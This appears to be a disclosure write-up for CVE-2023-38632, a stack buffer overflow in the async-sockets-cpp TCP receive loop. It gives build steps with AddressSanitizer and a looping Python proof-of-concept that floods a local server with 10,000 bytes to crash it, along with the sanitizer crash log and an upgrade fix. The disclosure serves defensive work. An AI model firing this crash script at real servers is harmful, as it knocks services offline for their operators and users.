# CVE-2023-38632

async-sockets-cpp through 0.3.1 contains a remote buffer overflow vulnerability in static void Receive(TCPSocket* socket) at tcpsocket.hpp, lines 102-110.  The buffer overflow affects all corresponding TCP servers.  The remote buffer overflow can be triggered by connecting to a socket and sending a large buffer of bytes.

```
 while ((messageLength = recv(socket->sock, tempBuffer, BUFFER_SIZE, 0)) > 0) 
 { 
     tempBuffer[messageLength] = '\0'; 
     if(socket->onMessageReceived) 
         socket->onMessageReceived(std::string(tempBuffer, messageLength)); 
      
     if(socket->onRawMessageReceived) 
         socket->onRawMessageReceived(tempBuffer, messageLength); 
 } 
```

To confirm the issue, unzip and compile the example tcp server (included in this repository) from the async-sockets-cpp-master/examples folder with debug symbols and address sanitizer:

```
$ unzip async-sockets-cpp-master.zip
$ cd async-sockets-cpp-master/examples
```

### Edit the Makefile to resemble the following:
```
CC		:= g++
CFLAGS	:= --std=c++11 -Wall -Wextra -Werror=conversion -fsanitize=address -g
LIBS	:= -lpthread -fsanitize=address
INC		:= ../async-sockets/include
RM		:= rm

.PHONY: all clean

all: tcp-client tcp-server udp-client udp-server

tcp-client: tcp-client.cpp $(INC)/tcpsocket.hpp
	$(CC) $(CFLAGS) $< -I$(INC) $(LIBS) -o $@

tcp-server: tcp-server.cpp $(INC)/tcpserver.hpp
	$(CC) $(CFLAGS) $< -I$(INC) $(LIBS) -o $@

udp-client: udp-client.cpp $(INC)/udpsocket.hpp
	$(CC) $(CFLAGS) $< -I$(INC) $(LIBS) -o $@

udp-server: udp-server.cpp $(INC)/udpserver.hpp
	$(CC) $(CFLAGS) $< -I$(INC) $(LIBS) -o $@

clean:
	$(RM) tcp-client
	$(RM) tcp-server
	$(RM) udp-client
	$(RM) udp-server
```

### Compilation

From the async-sockets-cpp-master/examples folder, execute the following command to compile the server:

```
$ make
```

Once the server is compiled, execute the tcp-server on port 8888:

```
$ ./tcp-server
```

The following python3 script will connect to the tcp-server and send a large packet with around 10,000 bytes of data.  The minimum size required to trigger the buffer overflow is 4096 bytes:

```
import socket

host = "localhost"
port = 8888                   # The same port as used by the server
buf = b'A'*10000               # Overflow happens at 4096 bytes

while(True):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(buf)
        data = s.recv(1024)
        s.close()
        #print('Received', repr(data))
    except:
        print("Completed...")

```

Executing the above python3 script will result in the server crashing and producing the following detailed output from address sanitizer showing the location of the stack buffer overflow:

```
$ python3 CVE-2023-38632.py
```

### ASAN Output

```
=================================================================
==1124507==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffff4ffdcb0 at pc 0x55555555ef97 bp 0x7ffff4ffcc00 sp 0x7ffff4ffcbf8
WRITE of size 1 at 0x7ffff4ffdcb0 thread T2
    #0 0x55555555ef96 in TCPSocket<(unsigned short)4096>::Receive(TCPSocket<(unsigned short)4096>*) ../async-sockets/include/tcpsocket.hpp:104
    #1 0x555555560775 in void std::__invoke_impl<void, void (*)(TCPSocket<(unsigned short)4096>*), TCPSocket<(unsigned short)4096>*>(std::__invoke_other, void (*&&)(TCPSocket<(unsigned short)4096>*), TCPSocket<(unsigned short)4096>*&&) /usr/include/c++/12/bits/invoke.h:61
    #2 0x5555555605eb in std::__invoke_result<void (*)(TCPSocket<(unsigned short)4096>*), TCPSocket<(unsigned short)4096>*>::type std::__invoke<void (*)(TCPSocket<(unsigned short)4096>*), TCPSocket<(unsigned short)4096>*>(void (*&&)(TCPSocket<(unsigned short)4096>*), TCPSocket<(unsigned short)4096>*&&) /usr/include/c++/12/bits/invoke.h:96
    #3 0x5555555604f2 in void std::thread::_Invoker<std::tuple<void (*)(TCPSocket<(unsigned short)4096>*), TCPSocket<(unsigned short)4096>*> >::_M_invoke<0ul, 1ul>(std::_Index_tuple<0ul, 1ul>) /usr/include/c++/12/bits/std_thread.h:252
    #4 0x55555556048f in std::thread::_Invoker<std::tuple<void (*)(TCPSocket<(unsigned short)4096>*), TCPSocket<(unsigned short)4096>*> >::operator()() /usr/include/c++/12/bits/std_thread.h:259
    #5 0x555555560453 in std::thread::_State_impl<std::thread::_Invoker<std::tuple<void (*)(TCPSocket<(unsigned short)4096>*), TCPSocket<(unsigned short)4096>*> > >::_M_run() /usr/include/c++/12/bits/std_thread.h:210
    #6 0x7ffff74d44a2  (/lib/x86_64-linux-gnu/libstdc++.so.6+0xd44a2)
    #7 0x7ffff76a7fd3 in start_thread nptl/pthread_create.c:442
    #8 0x7ffff77285bb in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81

Address 0x7ffff4ffdcb0 is located in stack of thread T2 at offset 4224 in frame
    #0 0x55555555eea1 in TCPSocket<(unsigned short)4096>::Receive(TCPSocket<(unsigned short)4096>*) ../async-sockets/include/tcpsocket.hpp:97

  This frame has 3 object(s):
    [48, 49) '<unknown>'
    [64, 96) '<unknown>'
    [128, 4224) 'tempBuffer' (line 99) <== Memory access at offset 4224 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
Thread T2 created by T1 here:
    #0 0x7ffff7849726 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:207
    #1 0x7ffff74d4578 in std::thread::_M_start_thread(std::unique_ptr<std::thread::_State, std::default_delete<std::thread::_State> >, void (*)()) (/lib/x86_64-linux-gnu/libstdc++.so.6+0xd4578)
    #2 0x55555555e36c in TCPSocket<(unsigned short)4096>::Listen() ../async-sockets/include/tcpsocket.hpp:87
    #3 0x55555555cf36 in TCPServer<(unsigned short)4096>::Accept(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>) ../async-sockets/include/tcpserver.hpp:84
    #4 0x555555560909 in void std::__invoke_impl<void, void (*)(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>), TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)> >(std::__invoke_other, void (*&&)(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>), TCPServer<(unsigned short)4096>*&&, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>&&) /usr/include/c++/12/bits/invoke.h:61
    #5 0x5555555606b5 in std::__invoke_result<void (*)(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>), TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)> >::type std::__invoke<void (*)(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>), TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)> >(void (*&&)(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>), TCPServer<(unsigned short)4096>*&&, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>&&) /usr/include/c++/12/bits/invoke.h:96
    #6 0x555555560558 in void std::thread::_Invoker<std::tuple<void (*)(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>), TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)> > >::_M_invoke<0ul, 1ul, 2ul>(std::_Index_tuple<0ul, 1ul, 2ul>) /usr/include/c++/12/bits/std_thread.h:252
    #7 0x5555555604ab in std::thread::_Invoker<std::tuple<void (*)(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>), TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)> > >::operator()() /usr/include/c++/12/bits/std_thread.h:259
    #8 0x555555560473 in std::thread::_State_impl<std::thread::_Invoker<std::tuple<void (*)(TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>), TCPServer<(unsigned short)4096>*, std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)> > > >::_M_run() /usr/include/c++/12/bits/std_thread.h:210
    #9 0x7ffff74d44a2  (/lib/x86_64-linux-gnu/libstdc++.so.6+0xd44a2)

Thread T1 created by T0 here:
    #0 0x7ffff7849726 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:207
    #1 0x7ffff74d4578 in std::thread::_M_start_thread(std::unique_ptr<std::thread::_State, std::default_delete<std::thread::_State> >, void (*)()) (/lib/x86_64-linux-gnu/libstdc++.so.6+0xd4578)
    #2 0x55555555beb3 in TCPServer<(unsigned short)4096>::Listen(std::function<void (int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)>) ../async-sockets/include/tcpserver.hpp:56
    #3 0x55555555814d in main /home/kali/projects/fuzzing/async-sockets-cpp/examples/tcp-server.cpp:42
    #4 0x7ffff7646189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

SUMMARY: AddressSanitizer: stack-buffer-overflow ../async-sockets/include/tcpsocket.hpp:104 in TCPSocket<(unsigned short)4096>::Receive(TCPSocket<(unsigned short)4096>*)
Shadow bytes around the buggy address:
  0x10007e9f7b40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007e9f7b50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007e9f7b60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007e9f7b70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007e9f7b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x10007e9f7b90: 00 00 00 00 00 00[f3]f3 f3 f3 f3 f3 f3 f3 f3 f3
  0x10007e9f7ba0: f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00
  0x10007e9f7bb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007e9f7bc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007e9f7bd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007e9f7be0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1124507==ABORTING

```
### Mitigation 

Upgrade the library to at least commit [78641cf](https://github.com/eminfedar/async-sockets-cpp/commit/78641cfde398d2cd71649f6911ee1bf4953498c0)

### References
* [CVE-2023-38632](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38632)
* [async-sockets-cpp](https://github.com/eminfedar/async-sockets-cpp)
